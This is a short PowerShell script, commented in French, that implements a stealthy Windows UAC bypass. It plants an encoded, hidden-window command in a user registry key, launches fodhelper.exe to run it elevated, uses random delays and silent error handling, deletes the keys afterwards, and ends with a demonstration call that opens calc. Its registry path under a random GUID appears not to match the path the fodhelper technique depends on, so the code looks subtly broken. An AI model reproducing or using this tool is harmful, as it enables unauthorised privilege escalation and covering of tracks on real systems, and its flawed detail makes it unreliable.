function Invoke-SilentUACBypass {
    param(
        [string]$Command = "powershell -nop -w hidden -c `"Start-Process calc`""
    )

    # Configuration silencieuse
    $ProgressPreference = 'SilentlyContinue'
    $ErrorActionPreference = 'SilentlyContinue'

    # Génération aléatoire du chemin de registre
    $randomGuid = [Guid]::NewGuid().ToString()
    $regPath = "HKCU:\Software\Classes\$randomGuid\Shell\Open\command"

    try {
        # Création des clés de registre de manière discrète
        $null = New-Item -Path $regPath -Force
        $null = New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force

        # Masquage de la payload dans le registre
        $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
        $finalPayload = "powershell -nop -w hidden -enc $encodedCmd"
        $null = Set-ItemProperty -Path $regPath -Name "(Default)" -Value $finalPayload -Force

        # Exécution via un processus système
        $procArgs = @{
            FilePath = "fodhelper.exe"
            WindowStyle = "Hidden"
            ErrorAction = "SilentlyContinue"
        }
        $null = Start-Process @procArgs

        # Temporisation aléatoire
        $randomDelay = Get-Random -Minimum 3 -Maximum 8
        Start-Sleep -Seconds $randomDelay
    }
    catch {
        # Gestion d'erreur silencieuse
        $errorMsg = $_.Exception.Message
        $null > $env:TEMP\error.log
    }
    finally {
        # Nettoyage avec temporisation aléatoire
        $randomCleanupDelay = Get-Random -Minimum 2 -Maximum 5
        Start-Sleep -Seconds $randomCleanupDelay
        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKCU:\Software\Classes\$randomGuid" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Exemple d'utilisation avec une commande encodée
Invoke-SilentUACBypass -Command "Start-Process calc.exe"
